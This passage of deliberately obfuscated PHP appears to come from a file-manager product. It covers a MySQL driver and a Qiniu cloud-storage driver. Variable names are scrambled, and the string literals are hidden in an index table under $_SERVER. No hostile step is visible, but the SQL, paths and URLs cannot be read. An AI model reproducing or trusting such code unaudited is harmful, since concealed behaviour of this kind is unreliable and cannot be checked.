(!$this->linkID[$×Şóøè] || !empty($«éºıÁ®[$äßßĞüñ[17]]) && !mysql_select_db($«éºıÁ®[$äßßĞüñ[17]], $this->linkID[$×Şóøè])) { think_exception(mysql_error()); } $§¿ÏÊ° = mysql_get_server_info($this->linkID[$×Şóøè]); mysql_query($äßßĞüñ[889] . think_config($äßßĞüñ[890]) . $äßßĞüñ[55], $this->linkID[$×Şóøè]); if ($§¿ÏÊ° > $äßßĞüñ[891]) { mysql_query($äßßĞüñ[892], $this->linkID[$×Şóøè]); } $this->connected = !0; if (1 != think_config($äßßĞüñ[18])) { unset($this->config); } } return $this->linkID[$×Şóøè]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ ŸŞÈ«¯) { $¯ı„‡àò =& $_SERVER[¥ÙÌÜ¾ê]; if (0 === stripos($ ŸŞÈ«¯, $¯ı„‡àò[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ ŸŞÈ«¯; if ($this->queryID) { $this->free(); } think_action_status($¯ı„‡àò[19], 1); think_status($¯ı„‡àò[20]); $this->queryID = mysql_query($ ŸŞÈ«¯, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($‹êÓ¦³) { $Ç—¤íòµ =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹êÓ¦³; if ($this->queryID) { $this->free(); } think_action_status($Ç—¤íòµ[21], 1); think_status($Ç—¤íòµ[20]); $û©‘¬ËÇ = mysql_query($‹êÓ¦³, $this->_linkID); $this->debug(); if (!1 === $û©‘¬ËÇ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¥ÙÌÜ¾ê][893], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $§®äÎªÊ = mysql_query($_SERVER[¥ÙÌÜ¾ê][894], $this->_linkID); $this->transTimes = 0; if (!$§®äÎªÊ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $×µ¹€ğ = mysql_query($_SERVER[¥ÙÌÜ¾ê][895], $this->_linkID); $this->transTimes = 0; if (!$×µ¹€ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $‘æ´Ïè² = array(); if ($this->numRows > 0) { while ($òõß÷«’ = mysql_fetch_assoc($this->queryID)) { $‘æ´Ïè²[] = $òõß÷«’; } mysql_data_seek($this->queryID, 0); } return $‘æ´Ïè²; } public function getFields($Û¬ªøê») { $í×ßµÎï =& $_SERVER[¥ÙÌÜ¾ê]; $Òé˜ïíñ = $this->query($í×ßµÎï[896] . $this->parseKey($Û¬ªøê»)); $Üß£ª³ = array(); if ($Òé˜ïíñ) { foreach ($Òé˜ïíñ as $Ã™¬åè™ => $Åé‰ĞÏ) { $Üß£ª³[$Åé‰ĞÏ[$í×ßµÎï[27]]] = array($í×ßµÎï[28] => $Åé‰ĞÏ[$í×ßµÎï[27]], $í×ßµÎï[29] => $Åé‰ĞÏ[$í×ßµÎï[30]], $í×ßµÎï[31] => (bool) (strtoupper($Åé‰ĞÏ[$í×ßµÎï[32]]) === $í×ßµÎï[897]), $í×ßµÎï[34] => $Åé‰ĞÏ[$í×ßµÎï[35]], $í×ßµÎï[36] => strtolower($Åé‰ĞÏ[$í×ßµÎï[37]]) == $í×ßµÎï[38], $í×ßµÎï[39] => strtolower($Åé‰ĞÏ[$í×ßµÎï[40]]) == $í×ßµÎï[41]); } } return $Üß£ª³; } public function getTables($á¡Œ¨ö = '') { $ï’¬Ç =& $_SERVER[¥ÙÌÜ¾ê]; if (!empty($á¡Œ¨ö)) { $â”“šÛô = $ï’¬Ç[898] . $á¡Œ¨ö . $ï’¬Ç[899]; } else { $â”“šÛô = $ï’¬Ç[900]; } $‡ƒáªøô = $this->query($â”“šÛô); $×‰êî× = array(); foreach ($‡ƒáªøô as $Ğ»Æ¦÷ª => $ë²ü½µ) { $×‰êî×[$Ğ»Æ¦÷ª] = current($ë²ü½µ); } return $×‰êî×; } public function replace($Ç‰‰Ö•, $ÊÓ­…¨ = array()) { $ÔÛ™ë«­ =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($Ç‰‰Ö• as $ÁŠ¤µÄ => $ñ¹’İ®) { $ĞÜ–¬õç = $this->parseValue($ñ¹’İ®); if (is_scalar($ĞÜ–¬õç)) { $Â›†Ë[] = $ĞÜ–¬õç; $öÚªïŸ¯[] = $this->parseKey($ÁŠ¤µÄ); } } $ç†¨«Ó— = $ÔÛ™ë«­[901] . $this->parseTable($ÊÓ­…¨[$ÔÛ™ë«­[277]]) . $ÔÛ™ë«­[902] . implode($ÔÛ™ë«­[47], $öÚªïŸ¯) . $ÔÛ™ë«­[903] . implode($ÔÛ™ë«­[47], $Â›†Ë) . $ÔÛ™ë«­[904]; return $this->execute($ç†¨«Ó—); } public function insertAll($øí©ùİÑ, $ŒÃ÷»¢İ = array(), $ÀöäÖŒ = false) { $ù§¹è¤ =& $_SERVER[¥ÙÌÜ¾ê]; if (!is_array($øí©ùİÑ[0])) { return !1; } $ª‰à§ = array_keys($øí©ùİÑ[0]); $Šİ­çÙš = array(); foreach ($øí©ùİÑ as $‘Œ™œÒ‘) { $¸ïğığİ = array(); foreach ($‘Œ™œÒ‘ as $á£Û¾Àî => $¯Áß±‹º) { $¯Áß±‹º = $this->parseValue($¯Áß±‹º); if (is_scalar($¯Áß±‹º)) { $¸ïğığİ[] = $¯Áß±‹º; } } $Šİ­çÙš[] = $ù§¹è¤[258] . implode($ù§¹è¤[47], $¸ïğığİ) . $ù§¹è¤[904]; } array_walk($ª‰à§, array($this, $ù§¹è¤[905])); $şÅ‚ÕŞ = ($ÀöäÖŒ ? $ù§¹è¤[906] : $ù§¹è¤[907]) . $ù§¹è¤[908] . $this->parseTable($ŒÃ÷»¢İ[$ù§¹è¤[277]]) . $ù§¹è¤[902] . implode($ù§¹è¤[47], $ª‰à§) . $ù§¹è¤[909] . implode($ù§¹è¤[47], $Šİ­çÙš); return $this->execute($şÅ‚ÕŞ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ü°¨ıÇ³ =& $_SERVER[¥ÙÌÜ¾ê]; $this->error = mysql_errno() . $Ü°¨ıÇ³[4] . mysql_error($this->_linkID); if ($Ü°¨ıÇ³[33] != $this->queryStr) { $this->error .= LNG($Ü°¨ıÇ³[45]) . $this->queryStr; } think_trace($this->error, $Ü°¨ıÇ³[33], $Ü°¨ıÇ³[46]); return $this->error; } public function escapeString($îµÏÚşù) { if ($this->_linkID) { return mysql_real_escape_string($îµÏÚşù, $this->_linkID); } else { return mysql_escape_string($îµÏÚşù); } } public function parseKey(&$ûà›ã í, $û½î§ó = true) { $Ÿ‘°ì‡ô =& $_SERVER[¥ÙÌÜ¾ê]; if ($û½î§ó) { $ûà›ã í = $this->parseKeyCheck($ûà›ã í); } if ($ûà›ã í != $Ÿ‘°ì‡ô[182] && !preg_match($Ÿ‘°ì‡ô[910], $ûà›ã í)) { $ûà›ã í = $Ÿ‘°ì‡ô[383] . trim($ûà›ã í, $Ÿ‘°ì‡ô[383]) . $Ÿ‘°ì‡ô[383]; } return $ûà›ã í; } } goto f®‹“Îä˜†; e‰ç²™Î: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($±ËùöÇÙ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¥ÙÌÜ¾ê][1349]; $this->_init($±ËùöÇÙ); } public function _init($ÃáÙĞ¤) { $Ï’Éµ± =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($ÃáÙĞ¤ as $¢ÔµŒëó => $İªÈß—İ) { if (isset($this->{$¢ÔµŒëó})) { $this->{$¢ÔµŒëó} = $İªÈß—İ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ï’Éµ±[1350] . LNG($Ï’Éµ±[1310])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($³ÇŒ×Õ, $£ôèµùİ = '', $Öú²§¼Ö = REPEAT_RENAME) { if ($this->setContent($³ÇŒ×Õ, $£ôèµùİ)) { return $this->getPathOuter($³ÇŒ×Õ); } return !1; } public function mkdir($ã¦¤¶§ú, $ „ÈÀ¤ = REPEAT_SKIP) { $æ’éÇ† =& $_SERVER[¥ÙÌÜ¾ê]; $ñ€¿ƒ³º = trim($ã¦¤¶§ú, $æ’éÇ†[8]); if ($this->_isFolder($ñ€¿ƒ³º)) { return $this->getPathOuter($ñ€¿ƒ³º); } $ã¦¤¶§ú = $ñ€¿ƒ³º . $æ’éÇ†[8]; $İ ŞìÚ€ = get_path_this($ñ€¿ƒ³º); $íûÜ Ü = $ã¦¤¶§ú . $İ ŞìÚ€; if (!$this->mkfile($íûÜ Ü)) { return !1; } if (!$this->moveFile($íûÜ Ü, $ã¦¤¶§ú)) { $this->delFile($íûÜ Ü); return !1; } return $this->getPathOuter($ñ€¿ƒ³º); } public function copyFile($„×æÛ§, $ãï‘ÜïÊ) { $ƒ°ˆÙ»• = $this->bucketManager->copy($this->bucket, $„×æÛ§, $this->bucket, $ãï‘ÜïÊ, !0); return $ƒ°ˆÙ»• ? !1 : $this->getPathOuter($ãï‘ÜïÊ); } public function moveFile($İ•ÑÕ¼õ, $Ë“Õà§Ò) { $İ‚¿¶”Ğ = $this->bucketManager->move($this->bucket, $İ•ÑÕ¼õ, $this->bucket, $Ë“Õà§Ò, !0); return $İ‚¿¶”Ğ ? !1 : $this->getPathOuter($Ë“Õà§Ò); } public function delFile($°æá‘¹û) { if (!$this->exist($°æá‘¹û)) { return !0; } $Å£×ÑÖş = $this->bucketManager->delete($this->bucket, $°æá‘¹û); return $Å£×ÑÖş ? !1 : !0; } public function delFolder($õ¹Ã“†¼) { $ÃĞñ‚ÏÛ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->exist($õ¹Ã“†¼)) { return !0; } $this->listItemCache = !1; $°í›¤ • = $this->fileList($õ¹Ã“†¼); $this->listItemCache = !0; $ÆÆ ¼òÍ = trim($õ¹Ã“†¼, $ÃĞñ‚ÏÛ[8]) . $ÃĞñ‚ÏÛ[8]; if (!empty($õ¹Ã“†¼) && $õ¹Ã“†¼ !== $ÃĞñ‚ÏÛ[191] && !in_array($ÆÆ ¼òÍ, $°í›¤ •[$ÃĞñ‚ÏÛ[75]])) { $°í›¤ •[$ÃĞñ‚ÏÛ[75]][] = $ÆÆ ¼òÍ; } $œ›¦ÇªŠ = $this->delByBatch($°í›¤ •[$ÃĞñ‚ÏÛ[74]]); if (!$œ›¦ÇªŠ) { return !1; } $œ›¦ÇªŠ = $this->delByBatch($°í›¤ •[$ÃĞñ‚ÏÛ[75]]); if (!$œ›¦ÇªŠ) { return !1; } return $this->delFile($ÆÆ ¼òÍ); } private function delByBatch($àåŞ¸—) { foreach (array_chunk($àåŞ¸—, 1000) as $ıäŞæ´) { $ İì–×¶ = $this->bucketManager->buildBatchDelete($this->bucket, $ıäŞæ´); list($ æƒƒ²”, $ÂŒàı½ä) = $this->bucketManager->batch($ İì–×¶); if ($ÂŒàı½ä) { return !1; } } return !0; } public function rename($Ï·şĞÑÛ, $„÷™¶„¼) { return $this->renameObject($Ï·şĞÑÛ, $„÷™¶„¼); } public function fileInfo($µ…Éİİ×, $­ˆğ³¤Á = false, $¯„Ü®‡ = array()) { $ƒ¬òÅ’Œ =& $_SERVER[¥ÙÌÜ¾ê]; $‚ô÷‹¶Œ = array($ƒ¬òÅ’Œ[28] => $this->pathThis($µ…Éİİ×), $ƒ¬òÅ’Œ[76] => $this->getPathOuter($ƒ¬òÅ’Œ[8] . $µ…Éİİ×), $ƒ¬òÅ’Œ[29] => $ƒ¬òÅ’Œ[193], $ƒ¬òÅ’Œ[78] => isset($¯„Ü®‡[$ƒ¬òÅ’Œ[1351]]) ? $¯„Ü®‡[$ƒ¬òÅ’Œ[1351]] : 0, $ƒ¬òÅ’Œ[168] => $this->ext($µ…Éİİ×)); if ($­ˆğ³¤Á) { return $‚ô÷‹¶Œ; } $‚ô÷‹¶Œ[$ƒ¬òÅ’Œ[194]] = $‚ô÷‹¶Œ[$ƒ¬òÅ’Œ[84]] = 0; $‚ô÷‹¶Œ[$ƒ¬òÅ’Œ[195]] = $‚ô÷‹¶Œ[$ƒ¬òÅ’Œ[196]] = !0; if (empty($¯„Ü®‡)) { $¯„Ü®‡ = $this->objectMeta($µ…Éİİ×); if (!$¯„Ü®‡) { return $‚ô÷‹¶Œ; } } if (isset($¯„Ü®‡[$ƒ¬òÅ’Œ[1352]])) { $‚ô÷‹¶Œ[$ƒ¬òÅ’Œ[84]] = substr($¯„Ü®‡[$ƒ¬òÅ’Œ[1352]] . $ƒ¬òÅ’Œ[33], 0, 10); } if (isset($¯„Ü®‡[$ƒ¬òÅ’Œ[1351]])) { $‚ô÷‹¶Œ[$ƒ¬òÅ’Œ[78]] = $¯„Ü®‡[$ƒ¬òÅ’Œ[1351]]; } return $‚ô÷‹¶Œ; } public function folderInfo($”×À€¢Æ, $Öç¢à³ = false) { $Ã»ÙûÆî =& $_SERVER[¥ÙÌÜ¾ê]; $èÂ©¨Ä¡ = array($Ã»ÙûÆî[28] => $this->pathThis($”×À€¢Æ), $Ã»ÙûÆî[76] => $this->getPathOuter($Ã»ÙûÆî[8] . $”×À€¢Æ), $Ã»ÙûÆî[29] => $Ã»ÙûÆî[77]); if ($Öç¢à³) { return $èÂ©¨Ä¡; } $èÂ©¨Ä¡[$Ã»ÙûÆî[194]] = $èÂ©¨Ä¡[$Ã»ÙûÆî[84]] = 0; $èÂ©¨Ä¡[$Ã»ÙûÆî[195]] = $èÂ©¨Ä¡[$Ã»ÙûÆî[196]] = !0; $”×À€¢Æ = rtrim($”×À€¢Æ, $Ã»ÙûÆî[8]) . $Ã»ÙûÆî[8]; $ß†Õ§… = $this->objectMeta($”×À€¢Æ); if (isset($ß†Õ§…[$Ã»ÙûÆî[1352]])) { $èÂ©¨Ä¡[$Ã»ÙûÆî[84]] = substr($ß†Õ§…[$Ã»ÙûÆî[1352]] . $Ã»ÙûÆî[33], 0, 10); } return $èÂ©¨Ä¡; } public function listPath($“é—õ ˜, $êØëûÙÓ = false) { $ÃÁøŞî =& $_SERVER[¥ÙÌÜ¾ê]; $…ôöš¶ = $this->fileList($“é—õ ˜, $ÃÁøŞî[8], !0); foreach ($…ôöš¶[$ÃÁøŞî[75]] as $îßäëÎÇ => $Ñù“ïÄŒ) { $…ôöš¶[$ÃÁøŞî[75]][$îßäëÎÇ] = $this->folderInfo($Ñù“ïÄŒ, $êØëûÙÓ); } foreach ($…ôöš¶[$ÃÁøŞî[74]] as $îßäëÎÇ => $Ñù“ïÄŒ) { $…ôöš¶[$ÃÁøŞî[74]][$îßäëÎÇ] = $this->fileInfo($Ñù“ïÄŒ[$ÃÁøŞî[93]], $êØëûÙÓ, $Ñù“ïÄŒ); } return $…ôöš¶; } public function has($îÅŠ¾è, $¸¶î¦ú = false, $ù™˜‘¼¬ = true) { $÷İ´”Ä” =& $_SERVER[¥ÙÌÜ¾ê]; $îÅŠ¾è = trim($îÅŠ¾è, $÷İ´”Ä”[8]); $Àğ³Îô = empty($îÅŠ¾è) && $îÅŠ¾è !== $÷İ´”Ä”[191] ? $÷İ´”Ä”[33] : $îÅŠ¾è . $÷İ´”Ä”[8]; $şÏµäÏ = $÷İ´”Ä”[33]; $ƒææàç = 500; $»šŞæ = $÷İ´”Ä”[8]; $ª¿å¨¸ = $¢´ïşÔ = 0; while (!0) { check_abort(); list($òŒä‰´É, $¾°”ƒêÇ) = $this->bucketManager->listFiles($this->bucket, $Àğ³Îô, $şÏµäÏ, $ƒææàç, $»šŞæ); if ($¾°”ƒêÇ) { break; } $şÏµäÏ = array_key_exists($÷İ´”Ä”[1322], $òŒä‰´É) ? $şÏµäÏ = $òŒä‰´É[$÷İ´”Ä”[1353]] : $÷İ´”Ä”[33]; if ($¸¶î¦ú) { if (!empty($òŒä‰´É[$÷İ´”Ä”[1354]])) { $ª¿å¨¸ += count($òŒä‰´É[$÷İ´”Ä”[1354]]); } if (!empty($òŒä‰´É[$÷İ´”Ä”[1355]])) { $¢´ïşÔ += count($òŒä‰´É[$÷İ´”Ä”[1355]]); } if ($şÏµäÏ === $÷İ´”Ä”[33]) { break; } continue; } if ($ù™˜‘¼¬) { if (!empty($òŒä‰´É[$÷İ´”Ä”[1354]])) { return !0; } } else { if (!empty($òŒä‰´É[$÷İ´”Ä”[1355]])) { return !0; } } if ($şÏµäÏ === $÷İ´”Ä”[33]) { break; } } if ($¸¶î¦ú) { return array($÷İ´”Ä”[203] => $ª¿å¨¸, $÷İ´”Ä”[204] => $¢´ïşÔ); } return !1; } public function listAll($”„¥ï¨») { $Ş¢Ü—´á =& $_SERVER[¥ÙÌÜ¾ê]; $ºİàªˆ¨ = $this->fileList($”„¥ï¨», $Ş¢Ü—´á[33], !0); $êŒù»Î¹ = array(); foreach ($ºİàªˆ¨[$Ş¢Ü—´á[74]] as $ı¡¦Š‘¬) { $êŒù»Î¹[$ı¡¦Š‘¬[$Ş¢Ü—´á[93]]] = $ı¡¦Š‘¬[$Ş¢Ü—´á[78]]; } foreach ($ºİàªˆ¨[$Ş¢Ü—´á[75]] as $ı¡¦Š‘¬) { if (is_string($ı¡¦Š‘¬)) { $êŒù»Î¹[$ı¡¦Š‘¬] = 0; } } return $this->listAllFiles($”„¥ï¨», array_keys($êŒù»Î¹), $êŒù»Î¹); } private function fileList($æÈ¯ÀÉã, $îª‰ü»‹ = '', $’ëøö¼ = 0) { $³“¯ı·ğ =& $_SERVER[¥ÙÌÜ¾ê]; $æÈ¯ÀÉã = trim($æÈ¯ÀÉã, $³“¯ı·ğ[8]); $ò‘ë¿Ùš = empty($æÈ¯ÀÉã) && $æÈ¯ÀÉã !== $³“¯ı·ğ[191] ? $³“¯ı·ğ[33] : $æÈ¯ÀÉã . $³“¯ı·ğ[8]; $÷ª–Ô = $³“¯ı·ğ[33]; $®ÔÙçë¶ = 1000; $øç‘üÍ– = $this->listItemCache === !1 ? !1 : !0; $ò¹—ıÈ— = $Ä¾‘×“ = array(); while (!0) { check_abort(); list($âµ³»îõ, $µäÍñƒ¡) = $this->bucketManager->listFiles($this->bucket, $ò‘ë¿Ùš, $÷ª–Ô, $®ÔÙçë¶, $îª‰ü»‹); if ($µäÍñƒ¡) { break; } $÷ª–Ô = array_key_exists($³“¯ı·ğ[1322], $âµ³»îõ) ? $÷ª–Ô = $âµ³»îõ[$³“¯ı·ğ[1353]] : $³“¯ı·ğ[33]; $ÆØÙÖ´‡ = isset($âµ³»îõ[$³“¯ı·ğ[1354]]) ? $âµ³»îõ[$³“¯ı·ğ[1354]] : array(); $èÌŞæâÕ = isset($âµ³»îõ[$³“¯ı·ğ[1355]]) ? $âµ³»îõ[$³“¯ı·ğ[1355]] : array(); foreach ($ÆØÙÖ´‡ as $–¦‰½À¹) { if ($–¦‰½À¹[$³“¯ı·ğ[93]] == $ò‘ë¿Ùš) { continue; } $íÀ£ªû… = $–¦‰½À¹[$³“¯ı·ğ[93]]; $Ûä’³Óõ = $–¦‰½À¹[$³“¯ı·ğ[1351]]; $–¦‰½À¹[$³“¯ı·ğ[78]] = $Ûä’³Óõ; $óùÍÒÀ« = $Ûä’³Óõ == 0 && substr($íÀ£ªû…, strlen($íÀ£ªû…) - 1, 1) == $³“¯ı·ğ[8] ? !0 : !1; if ($øç‘üÍ–) { $this->cacheMethod($³“¯ı·ğ[199], $íÀ£ªû…, $óùÍÒÀ«); $this->cacheMethod($³“¯ı·ğ[200], $íÀ£ªû…, $–¦‰½À¹); } if ($óùÍÒÀ«) { $ò¹—ıÈ—[] = $íÀ£ªû…; continue; } $Ä¾‘×“[] = $’ëøö¼ ? $–¦‰½À¹ : $íÀ£ªû…; } foreach ($èÌŞæâÕ as $íÀ£ªû…) { if ($íÀ£ªû… == $ò‘ë¿Ùš) { continue; } $ò¹—ıÈ—[] = $íÀ£ªû…; if ($øç‘üÍ–) { $this->cacheMethod($³“¯ı·ğ[199], $íÀ£ªû…, !0); } } if ($÷ª–Ô === $³“¯ı·ğ[33]) { break; } } if ($øç‘üÍ–) { $this->cacheMethod($³“¯ı·ğ[199], $æÈ¯ÀÉã, !0); } return array($³“¯ı·ğ[75] => $ò¹—ıÈ—, $³“¯ı·ğ[74] => $Ä¾‘×“); } public function canRead($Á»‘“¦) { return $this->exist($Á»‘“¦) ? !0 : !1; } public function canWrite($äøÑÜ·×) { return $this->exist($äøÑÜ·×) ? !0 : !1; } public function getContent($ä§³óÛ¶) { return $this->fileSubstr($ä§³óÛ¶, 0, -1); } public function setContent($şîè¨º, $ú¶áÑ¥Â = '') { $¹ˆÑ¸Ú¸ = $this->tempFile($this->pathThis($şîè¨º)); file_put_contents($¹ˆÑ¸Ú¸, $ú¶áÑ¥Â); if ($this->upload($şîè¨º, $¹ˆÑ¸Ú¸)) { $this->tempFileRemve($¹ˆÑ¸Ú¸); return !0; } return !1; } public function refreshUrls($ÍÔÃ°ö) { $ŠÊÛûëÚ =& $_SERVER[¥ÙÌÜ¾ê]; $ §¼âò = array(); if (is_array($ÍÔÃ°ö)) { foreach ($ÍÔÃ°ö as $®ÙîÏ¾¸) { $ §¼âò[] = $this->link($®ÙîÏ¾¸); } } else { $ §¼âò[] = $this->link($ÍÔÃ°ö); } $Ç¢òé… = new Qiniu\Cdn\CdnManager($this->auth); list($©¨•Ú‰Ä, $ô‘Œ¼ì) = $Ç¢òé…->refreshUrls($ §¼âò); if ($ô‘Œ¼ì) { return !1; } return $©¨•Ú‰Ä[$ŠÊÛûëÚ[1113]] == $ŠÊÛûëÚ[753] ? !0 : !1; } public function fileSubstr($ÜîÔõåƒ, $¼–ƒñÌ¤, $ß’ƒÍ¶) { $„œÏ„×Ú =& $_SERVER[¥ÙÌÜ¾ê]; if (!($’Ë»ğí = $this->link($ÜîÔõåƒ))) { return !1; } $é¦±˜ƒ = !1; if ($ß’ƒÍ¶ > 0) { $ãµÉÂŠÚ = $¼–ƒñÌ¤ + $ß’ƒÍ¶ - 1; $é¦±˜ƒ = array($„œÏ„×Ú[1356] . $¼–ƒñÌ¤ . $„œÏ„×Ú[454] . $ãµÉÂŠÚ); } $•ï˜Œ–Ã = url_request($’Ë»ğí, $„œÏ„×Ú[228], !1, $é¦±˜ƒ); return $•ï˜Œ–Ã[$„œÏ„×Ú[743]] ? $•ï˜Œ–Ã[$„œÏ„×Ú[1123]] : !1; } public function upload($¾ «¤À¹, $™‰§¥¯Å, $™İ‡¼é = false, $Àù‘ë‰Ë = REPEAT_REPLACE) { $¯‹¬Éı» = new Qiniu\Storage\UploadManager(); $¢¡öÌµ = $this->auth->uploadToken($this->bucket, $¾ «¤À¹); $¦ëªéèã = get_file_mime(get_path_ext($™‰§¥¯Å)); list($Ã™õ¨ñÃ, $«ˆÅ±ºÁ) = $¯‹¬Éı»->putFile($¢¡öÌµ, $¾ «¤À¹, $™‰§¥¯Å, null, $¦ëªéèã); return $«ˆÅ±ºÁ ? !1 : $this->getPathOuter($¾ «¤À¹); } public function uploadFormData($¯ƒé˜ å, $ç²÷¿–Õ = 3600) { return $this->uploadToken($¯ƒé˜ å, $ç²÷¿–Õ); } public function multiUploadFormData($êÍÏ€Ø, $éàø£²« = 3600) { return $this->uploadToken($êÍÏ€Ø, $éàø£²«); } private function uploadToken($¡±”ìŠš, $ıîÌûõ° = 3600) { $ç»×ÔÖú =& $_SERVER[¥ÙÌÜ¾ê]; $ÇúÜêœò = $ıîÌûõ°; $Òí’âÍ° = array($ç»×ÔÖú[1357] => $ç»×ÔÖú[1358]); $ÏÏäËŞ = $¡±”ìŠš; $ãÉ²×Ë² = $this->auth->uploadToken($this->bucket, $ÏÏäËŞ, $ÇúÜêœò, $Òí’âÍ°, !0); $ŒöãÕ§² = empty($this->region) || $this->region == $ç»×ÔÖú[1359] ? $ç»×ÔÖú[33] : $ç»×ÔÖú[454] . $this->region; $¬‡¢Ü£± = http_type() . "\x3a\57\x2f\165\160\x6c\157\x61\x64{$ŒöãÕ§²}\x2e\x71\x69\156\151\165\160\56\x63\x6f\x6d\57"; return array($ç»×ÔÖú[1360] => $ãÉ²×Ë², $ç»×ÔÖú[1361] => $¬‡¢Ü£±); } public function download($Æ´Ë¯óè, $Æ¾ ¢–ë) { $Û¿ù§ïí = IO::getPathInner(IO::mkfile($Æ¾ ¢–ë)); if (!($Úû‘ ÷³ = $this->link($Æ´Ë¯óè))) { return !1; } $óŒ¹‰ì¼ = 0; $®ÌÚÉÖû = 1024 * 200; $æ¶¹½çŠ = fopen($Û¿ù§ïí, $_SERVER[¥ÙÌÜ¾ê][1362]); while (!0) { $”’× ˆ® = $this->fileSubstr($Æ´Ë¯óè, $óŒ¹‰ì¼, $®ÌÚÉÖû); if ($”’× ˆ® === !1) { return !1; } fwrite($æ¶¹½çŠ, $”’× ˆ®); $óŒ¹‰ì¼ += $®ÌÚÉÖû; if (strlen($”’× ˆ®) < $®ÌÚÉÖû) { break; } } fclose($æ¶¹½çŠ); return $Æ¾ ¢–ë; } public function link($Ì¼„Ó, $…Ÿ›ì¤¹ = '') { if (!$this->isFile($Ì¼„Ó)) { return !1; } $Åó²ì¿‘ = $this->getHost() . $_SERVER[¥ÙÌÜ¾ê][8] . $this->pathEncode($Ì¼„Ó) . $…Ÿ›ì¤¹; return $this->auth->privateDownloadUrl($Åó²ì¿‘, 3600 * 12); } public function fileOut($–¨€æó, $æá„Äö„ = false, $˜İ½‚ˆ¾ = false, $­³’á‡€ = '') { $ìûí‘â =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($–¨€æó, $æá„Äö„, $˜İ½‚ˆ¾, $­³’á‡€); } if (!$˜İ½‚ˆ¾) { $˜İ½‚ˆ¾ = $this->pathThis($–¨€æó); } $şØŞŸ£ = $æá„Äö„ ? $ìûí‘â[1363] . rawurlencode($˜İ½‚ˆ¾) : $ìûí‘â[33]; $Öç¦ààÒ = $this->link($–¨€æó, $şØŞŸ£); $this->fileOutLink($Öç¦ààÒ); } public function fileOutServer($£™Ú²ş, $àÊß«„ = false, $–’êÉÙ = false, $Æ¶ó àò = '') { parent::fileOut($£™Ú²ş, $àÊß«„, $–’êÉÙ, $Æ¶ó àò); } public function fileOutImage($ÙÛöğè¤, $°–˜ÂñÛ = 250) { $ÂåØ£Õ = $this->link($ÙÛöğè¤, $_SERVER[¥ÙÌÜ¾ê][1364] . $°–˜ÂñÛ); $this->fileOutLink($ÂåØ£Õ); } public function fileOutImageServer($ÊÍ¹×Ÿ, $²­áêìø = 250) { parent::fileOutImage($ÊÍ¹×Ÿ, $²­áêìø); } public function hashMd5($Ø©ÔÀ¬) { $ÜÁ¤ÙÂ¯ =& $_SERVER[¥ÙÌÜ¾ê]; $ÂıÛ‰ = $this->objectMeta($Ø©ÔÀ¬); return isset($ÂıÛ‰[$ÜÁ¤ÙÂ¯[208]]) ? $ÂıÛ‰[$ÜÁ¤ÙÂ¯[208]] : !1; $ç¢„½Â = $this->link($Ø©ÔÀ¬, $ÜÁ¤ÙÂ¯[1365]); } public function size($¦Â§ øÜ) { $ñ½º¥îŒ = $this->objectMeta($¦Â§ øÜ); return $ñ½º¥îŒ ? $ñ½º¥îŒ[$_SERVER[¥ÙÌÜ¾ê][78]] : 0; } public function info($ÈßÏàóú) { if ($this->isFolder($ÈßÏàóú)) { return $this->folderInfo($ÈßÏàóú); } else { if ($this->isFile($ÈßÏàóú)) { return $this->fileInfo($ÈßÏàóú); } } return !1; } public function exist($¤Ï˜ªÑ) { return $this->isFile($¤Ï˜ªÑ) || $this->isFolder($¤Ï˜ªÑ); } public function isFile($÷Âç÷) { return !$this->isFolder($÷Âç÷) && $this->objectMeta($÷Âç÷); } public function isFolder($†µ®‰Òî) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][199], $†µ®‰Òî); } protected function objectMeta($ï¯ÊÉ§Õ) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][200], $ï¯ÊÉ§Õ); } protected function _objectMeta($Ü‹ßÎ) { $œ¢Ø’Ş³ =& $_SERVER[¥ÙÌÜ¾ê]; list($€¶Œ© , $×ÈÕ×Šò) = $this->bucketManager->stat($this->bucket, $Ü‹ßÎ); if ($€¶Œ© ) { $€¶Œ© [$œ¢Ø’Ş³[78]] = intval($€¶Œ© [$œ¢Ø’Ş³[1351]]); } return $€¶Œ© ; } protected function _isFolder($–ö¬éÙº) { $§™Âê«Ã =& $_SERVER[¥ÙÌÜ¾ê]; if ($–ö¬éÙº == $§™Âê«Ã[33] || $–ö¬éÙº == $§™Âê«Ã[8]) { return !0; } list($·ã¢“ŒÔ, $šÃ„­Ç) = $this->bucketManager->listFiles($this->bucket, trim($–ö¬éÙº, $§™Âê«Ã[8]) . $§™Âê«Ã[8], $§™Âê«Ã[33], 1, $§™Âê«Ã[8]); return 